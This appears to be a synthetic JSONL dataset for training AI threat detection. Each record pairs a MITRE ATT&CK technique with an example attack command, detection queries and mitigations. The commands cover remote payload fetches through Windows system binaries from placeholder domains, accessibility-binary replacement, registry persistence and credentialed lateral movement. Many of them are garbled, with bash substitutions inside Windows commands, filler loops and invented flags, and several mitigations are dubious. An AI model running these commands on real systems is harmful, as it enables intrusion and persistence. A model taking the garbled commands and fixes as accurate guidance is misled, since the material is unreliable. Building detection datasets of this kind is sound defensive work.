{"id":317,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using timeout to delay malicious execution.","command":"timeout /t $(shuf -i 10-60 -n 1) && start C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor timeout: `wmic process where name='timeout.exe' get commandline | findstr start`; Event ID 4688.","mitigation":"Restrict timeout: `icacls %windir%\\System32\\timeout.exe /deny Everyone:RX`; Audit process creation: `auditpol /set /subcategory:'Process Creation' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect timeout delayed execution and suggest process auditing."}
{"id":318,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using PowerShell to collect DNS cache.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-DnsClientCache | Out-File C:\\$(echo dns$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor DNS cache collection: `wmic process where name='powershell.exe' get commandline | findstr Get-DnsClientCache`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS cache collection and suggest execution policy restrictions."}
{"id":319,"tactic":"Lateral Movement","technique":"T1021.006: Remote Services: Windows Remote Management","threat":"Using PowerShell to execute commands via WinRM with alternate credentials.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $cred = New-Object System.Management.Automation.PSCredential ('$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)', (ConvertTo-SecureString '$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)' -AsPlainText -Force)); Invoke-Command -ComputerName $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -Credential $cred -ScriptBlock { I$(echo 'malicious' | base64 -w0) }\"","detection":"Monitor WinRM credential use: `wmic process where name='powershell.exe' get commandline | findstr PSCredential`; Event ID 4688.","mitigation":"Disable WinRM: `Disable-PSRemoting -Force`; Block WinRM: `netsh advfirewall firewall add rule name='Block WinRM' dir=in action=block protocol=TCP localport=5985`.","references":["MITRE ATT&CK T1021.006: https://attack.mitre.org/techniques/T1021/006/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect PowerShell WinRM credential execution and suggest WinRM restrictions."}
{"id":320,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Abusing osk.exe for persistence via replacement.","command":"copy /y $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\osk.exe","detection":"Monitor osk changes: `dir %windir%\\System32\\osk.exe /a`; Event ID 4657.","mitigation":"Restrict osk: `icacls %windir%\\System32\\osk.exe /deny Everyone:WX`; Enable file integrity monitoring: `sfc /scannow`.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect osk tampering and suggest file protections."}
{"id":321,"tactic":"Defense Evasion","technique":"T1218.004: InstallUtil","threat":"Using InstallUtil.exe to execute malicious .NET binary via HTTP.","command":"InstallUtil /logfile= /LogToConsole=false /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor InstallUtil HTTP: `wmic process where name='InstallUtil.exe' get commandline | findstr http`; YARA rule: `rule InstallUtilHttp { strings: $a = /InstallUtil.*http/ nocase; condition: $a }`.","mitigation":"Restrict InstallUtil: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /deny Everyone:RX`; Block .NET downloads: `netsh advfirewall firewall add rule name='Block InstallUtil' dir=out program='%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe' action=block`.","references":["MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect InstallUtil HTTP execution and suggest firewall rules."}
{"id":322,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse nslookup for DNS reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; nslookup $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com | Out-File C:\\$(echo ns$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor nslookup: `wmic process where name='nslookup.exe' get commandline | findstr .com`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell nslookup reconnaissance and suggest execution policy restrictions."}
{"id":323,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system BIOS information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-CimInstance -ClassName Win32_BIOS | Out-File C:\\$(echo bios$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor BIOS collection: `wmic process where name='powershell.exe' get commandline | findstr Win32_BIOS`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell BIOS collection and suggest execution policy restrictions."}
{"id":324,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using wmic to execute remote SMB commands with alternate credentials.","command":"wmic /node:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /user:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /password:$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) process call create \"powershell -c 'I$(echo malicious | base64 -w0)'\"","detection":"Monitor wmic credential use: `wmic process where name='wmic.exe' get commandline | findstr /user`; Event ID 4688.","mitigation":"Restrict wmic: `icacls %windir%\\System32\\wbem\\wmic.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect wmic SMB credential execution and suggest SMB restrictions."}
{"id":325,"tactic":"Persistence","technique":"T1546.012: Image File Execution Options Injection","threat":"Using IFEO to inject malicious debugger locally.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /t REG_SZ /d \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor IFEO: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | findstr Debugger`; Event ID 4657.","mitigation":"Restrict IFEO writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect local IFEO debugger injections and suggest registry protections."}
{"id":326,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp.exe to execute malicious INF via HTTP.","command":"cmstp /ni /s http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor cmstp HTTP: `wmic process where name='cmstp.exe' get commandline | findstr http`; YARA rule: `rule CmstpHttpInf { strings: $a = /cmstp.*http.*inf/ nocase; condition: $a }`.","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Block INF downloads: `netsh advfirewall firewall add rule name='Block cmstp' dir=out program='%windir%\\System32\\cmstp.exe' action=block`.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp HTTP INF execution and suggest firewall rules."}
{"id":327,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse ping for network reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; ping $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -n 10 | Out-File C:\\$(echo ping$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor ping: `wmic process where name='ping.exe' get commandline | findstr .com`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell ping reconnaissance and suggest execution policy restrictions."}
{"id":328,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system CPU information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-CimInstance -ClassName Win32_Processor | Out-File C:\\$(echo cpu$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor CPU collection: `wmic process where name='powershell.exe' get commandline | findstr Win32_Processor`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell CPU information collection and suggest execution policy restrictions."}
{"id":329,"tactic":"Lateral Movement","technique":"T1021.004: Remote Services: SSH","threat":"Using ssh to execute commands with alternate SSH key.","command":"ssh -i /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).key $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com \"bash -c '/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh'\"","detection":"Monitor SSH key use: `ps aux | grep ssh | grep .key`; Monitor SSH traffic: `netstat -anp | grep :22`.","mitigation":"Restrict SSH: `chmod 700 /usr/bin/ssh`; Block SSH outbound: `iptables -A OUTPUT -p tcp --dport 22 -j DROP`.","references":["MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect SSH alternate key execution and suggest SSH restrictions."}
{"id":330,"tactic":"Persistence","technique":"T1546.014: Emond","threat":"Abusing emond on macOS locally for persistence.","command":"echo 'command=/bin/bash -c \"/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist && launchctl load /etc/emond.d/rules/*","detection":"Monitor emond rules: `ls /etc/emond.d/rules | grep .plist`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.","mitigation":"Restrict emond rules: `chmod 700 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.","references":["MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect local emond tampering and suggest access controls."}
{"id":331,"tactic":"Defense Evasion","technique":"T1218.012: Verclsid","threat":"Using verclsid.exe to execute malicious COM object via HTTP.","command":"verclsid /S /C {$(uuidgen)} /I http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor verclsid HTTP: `wmic process where name='verclsid.exe' get commandline | findstr http`; YARA rule: `rule VerclsidHttpDll { strings: $a = /verclsid.*http/ nocase; condition: $a }`.","mitigation":"Restrict verclsid: `icacls %windir%\\System32\\verclsid.exe /deny Everyone:RX`; Block COM downloads: `netsh advfirewall firewall add rule name='Block verclsid' dir=out program='%windir%\\System32\\verclsid.exe' action=block`.","references":["MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect verclsid HTTP COM execution and suggest firewall rules."}
{"id":332,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse tracert for network reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; tracert $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com | Out-File C:\\$(echo trace$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor tracert: `wmic process where name='tracert.exe' get commandline | findstr .com`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell tracert reconnaissance and suggest execution policy restrictions."}
{"id":333,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system motherboard information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-CimInstance -ClassName Win32_BaseBoard | Out-File C:\\$(echo mb$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor motherboard collection: `wmic process where name='powershell.exe' get commandline | findstr Win32_BaseBoard`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell motherboard information collection and suggest execution policy restrictions."}
{"id":334,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using schtasks to schedule malicious task on remote SMB share.","command":"schtasks /create /s \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /tn $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /tr \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /sc daily /f","detection":"Monitor schtasks remote: `wmic process where name='schtasks.exe' get commandline | findstr /s`; Event ID 4698.","mitigation":"Restrict schtasks: `icacls %windir%\\System32\\schtasks.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect schtasks SMB task scheduling and suggest SMB restrictions."}
{"id":335,"tactic":"Persistence","technique":"T1546.010: AppInit DLLs","threat":"Registering malicious AppInit DLL locally.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor AppInit DLLs: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs | findstr .dll`; Event ID 4657.","mitigation":"Restrict AppInit writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.010: https://attack.mitre.org/techniques/T1546/010/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect local AppInit DLL tampering and suggest registry protections."}
{"id":336,"tactic":"Defense Evasion","technique":"T1218.008: Odbcconf","threat":"Using odbcconf.exe to execute malicious driver via HTTP.","command":"odbcconf /S /A {CONFIGSYSDSN \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"}","detection":"Monitor odbcconf HTTP: `wmic process where name='odbcconf.exe' get commandline | findstr http`; YARA rule: `rule OdbcconfHttpDll { strings: $a = /odbcconf.*http/ nocase; condition: $a }`.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block odbcconf' dir=out program='%windir%\\System32\\odbcconf.exe' action=block`.","references":["MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf HTTP driver execution and suggest firewall rules."}
{"id":337,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse pathping for network reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; pathping $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com | Out-File C:\\$(echo path$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor pathping: `wmic process where name='pathping.exe' get commandline | findstr .com`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell pathping reconnaissance and suggest execution policy restrictions."}
{"id":338,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system OS information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-CimInstance -ClassName Win32_OperatingSystem | Out-File C:\\$(echo os$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor OS collection: `wmic process where name='powershell.exe' get commandline | findstr Win32_OperatingSystem`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell OS information collection and suggest execution policy restrictions."}
{"id":339,"tactic":"Lateral Movement","technique":"T1021.006: Remote Services: Windows Remote Management","threat":"Using winrm to execute commands via HTTP endpoint.","command":"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"powershell -c 'I$(echo malicious | base64 -w0)'\"} -r:http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com:5985","detection":"Monitor winrm HTTP: `wmic process where name='winrm.cmd' get commandline | findstr http`; Event ID 4688.","mitigation":"Disable WinRM: `Disable-PSRemoting -Force`; Block WinRM: `netsh advfirewall firewall add rule name='Block WinRM' dir=in action=block protocol=TCP localport=5985`.","references":["MITRE ATT&CK T1021.006: https://attack.mitre.org/techniques/T1021/006/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect winrm HTTP execution and suggest WinRM restrictions."}
{"id":340,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Abusing narrator.exe for persistence via replacement.","command":"copy /y $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\narrator.exe","detection":"Monitor narrator changes: `dir %windir%\\System32\\narrator.exe /a`; Event ID 4657.","mitigation":"Restrict narrator: `icacls %windir%\\System32\\narrator.exe /deny Everyone:WX`; Enable file integrity monitoring: `sfc /scannow`.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect narrator tampering and suggest file protections."}
{"id":341,"tactic":"Defense Evasion","technique":"T1218.014: MMC","threat":"Using mmc.exe to execute malicious MSC via HTTP.","command":"mmc http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor mmc HTTP: `wmic process where name='mmc.exe' get commandline | findstr http`; YARA rule: `rule MmcHttpMsc { strings: $a = /mmc.*http.*msc/ nocase; condition: $a }`.","mitigation":"Restrict mmc: `icacls %windir%\\System32\\mmc.exe /deny Everyone:RX`; Block MSC downloads: `netsh advfirewall firewall add rule name='Block mmc' dir=out program='%windir%\\System32\\mmc.exe' action=block`.","references":["MITRE ATT&CK T1218.014: https://attack.mitre.org/techniques/T1218/014/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mmc HTTP MSC execution and suggest firewall rules."}
{"id":342,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse netsh for network interface enumeration.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; netsh interface show interface | Out-File C:\\$(echo iface$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor netsh interface: `wmic process where name='netsh.exe' get commandline | findstr interface`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell netsh interface enumeration and suggest execution policy restrictions."}
{"id":343,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system network adapter information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-NetAdapter | Out-File C:\\$(echo netad$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor network adapter collection: `wmic process where name='powershell.exe' get commandline | findstr Get-NetAdapter`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell network adapter collection and suggest execution policy restrictions."}
{"id":344,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using at.exe to schedule malicious task on remote SMB share with credentials.","command":"at \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(date +%H:%M -d '+1 minute') /interactive cmd /c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat) /user:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /password:$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor at remote credential use: `wmic process where name='at.exe' get commandline | findstr /user`; Event ID 4698.","mitigation":"Restrict at: `icacls %windir%\\System32\\at.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect at.exe SMB task scheduling with credentials and suggest SMB restrictions."}
{"id":345,"tactic":"Persistence","technique":"T1547.004: Winlogon","threat":"Modifying Winlogon registry locally for persistence.","command":"reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /t REG_SZ /d \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe),\" /f","detection":"Monitor Winlogon changes: `reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit | findstr .exe`; Event ID 4657.","mitigation":"Restrict Winlogon writes: `regini -h deny HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1547.004: https://attack.mitre.org/techniques/T1547/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect local Winlogon tampering and suggest registry protections."}
{"id":346,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 with user32.dll to execute malicious payload.","command":"rundll32 user32.dll,MessageBoxTimeoutA 0 \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" \"Title\" 0x40000 5000","detection":"Monitor rundll32 user32: `wmic process where name='rundll32.exe' get commandline | findstr user32`; YARA rule: `rule Rundll32User32 { strings: $a = /rundll32.*user32.*http/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block user32 execution: AppLocker.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 user32 execution and suggest AppLocker policies."}
{"id":347,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse ipconfig for network reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; ipconfig /all | Out-File C:\\$(echo ip$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor ipconfig: `wmic process where name='ipconfig.exe' get commandline | findstr /all`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell ipconfig reconnaissance and suggest execution policy restrictions."}
{"id":348,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system disk partition information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-Partition | Out-File C:\\$(echo part$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor partition collection: `wmic process where name='powershell.exe' get commandline | findstr Get-Partition`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell disk partition collection and suggest execution policy restrictions."}
{"id":349,"tactic":"Lateral Movement","technique":"T1021.004: Remote Services: SSH","threat":"Using sftp to transfer malicious payload to remote Linux host.","command":"sftp $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com:/tmp <<< $'put $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sh)'","detection":"Monitor sftp: `ps aux | grep sftp | grep sh`; Monitor SSH traffic: `netstat -anp | grep :22`.","mitigation":"Restrict sftp: `chmod 700 /usr/bin/sftp`; Block SSH outbound: `iptables -A OUTPUT -p tcp --dport 22 -j DROP`.","references":["MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect sftp payload transfer and suggest SSH restrictions."}
